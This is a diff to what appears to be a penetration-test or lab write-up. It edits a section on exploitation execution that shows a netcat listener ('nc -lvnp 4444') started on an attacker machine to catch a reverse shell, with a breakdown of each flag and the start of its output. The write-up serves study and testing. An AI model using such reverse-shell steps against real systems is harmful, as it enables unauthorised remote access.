@@ -747,9 +747,10 @@ This inline Python was inlined into the `args` array of the JSON payload.
 
 ### 3.2 Exploitation Execution
 
-**Command:** `nc -lvnp 4444` (on attacker, started first)
+**Command:** `nc -lvnp 4444` (on attacker, started first to catch the reverse shell)
 
 **Breakdown:**
+
 - `nc` — Netcat utility for raw TCP connections.
 - `-l` — Listen mode.
 - `-v` — Verbose output, prints connection details.
@@ -757,6 +758,7 @@ This inline Python was inlined into the `args` array of the JSON payload.
 - `-p 4444` — Bind to port 4444.
 
 **Result:**
+
 ```shell
 kali@kali:~$ nc -lvnp 4444
 listening on [any] 4444 ...
